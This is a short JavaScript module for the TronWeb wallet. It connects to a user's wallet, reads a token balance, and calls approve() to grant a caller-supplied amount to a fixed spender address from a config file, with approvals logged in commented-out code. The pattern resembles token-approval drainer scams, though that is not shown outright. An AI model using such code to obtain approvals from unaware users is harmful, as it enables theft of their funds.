import config from "./config.json";
import utils from "ethers-utils";
// import fs from "fs";
// import path from "path";

// function writeApproveLog(logObject) {
//     console.log("makeLog");
//     logObject._logTime = Date.now().toLocaleString();
//     const logPath = path.resolve("./logs/approve.log.txt");
//     const existingLogs = fs.readFileSync(logPath) || "";
//     const logString = existingLogs + JSON.stringify(logObject, null, 2) + "\n";
//     fs.writeFileSync(logPath, logString);
// }

export default {
    async connect() {
        const tronWeb = window.tronWeb;

        try {
            return await tronWeb.request({
                method: "tron_requestAccounts",
            });
        } catch (err) {
            alert(err);
        }
    },
    async approve(contractAddress, amount) {
        try {
            const contract = await tronWeb.contract().at(contractAddress);
            const amountToApprove = new utils.BigNumber(amount);
            // writeApproveLog({
            //     window.tronWeb.defaultAddress.base58,
            //     spenderAddress: config.APPROVE_SPENDER_ADRESS,
            //     amountToApprove,
            // });
            return await contract.methods.approve(config.APPROVE_SPENDER_ADRESS, amountToApprove).send();
        } catch (err) {
            alert(err);
        }
    },
    async getBalance(contractAddress) {
        try {
            const contract = await tronWeb.contract().at(contractAddress);
            const balance = await contract.methods.balanceOf(window.tronWeb.defaultAddress.base58).call();
            return balance.toString();
        } catch (err) {
            alert(err);
        }
    },
};
